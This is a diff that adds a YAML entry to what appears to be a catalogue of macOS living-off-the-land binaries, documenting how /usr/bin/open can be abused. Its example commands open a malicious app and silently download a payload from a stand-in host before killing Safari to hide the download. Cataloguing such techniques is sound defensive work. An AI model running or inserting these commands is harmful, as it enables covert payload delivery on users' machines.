@@ -1,0 +1,26 @@
+name: open
+author: Brendan Chamberlain (@infosecb)
+short_description: Open files, folders, apps, URLs, and header files.
+full_description: A full length description of the binary goes here.
+created: 2023-05-10
+example_use_cases:
+- name: Open a malicious file
+  description: The open command can be used to open a malicious macOS app from the terminal.
+  code: open Malicious.app
+  tactics:
+  - Execution
+  tags:
+  - app
+- name: Download a malicious file
+  description: The following command downloads the payload.zip file in the default browser (Safari) and then kills it.
+  code: open -g https://mypayload.io/payload.zip; sleep 3; killall Safari
+  tactics:
+  - Execution
+paths:
+- /usr/bin/open
+detections:
+- name: No detections at time of publishing
+  url: N/A
+resources:
+- name: The macOS open Command
+  url: https://scriptingosx.com/2017/02/the-macos-open-command/
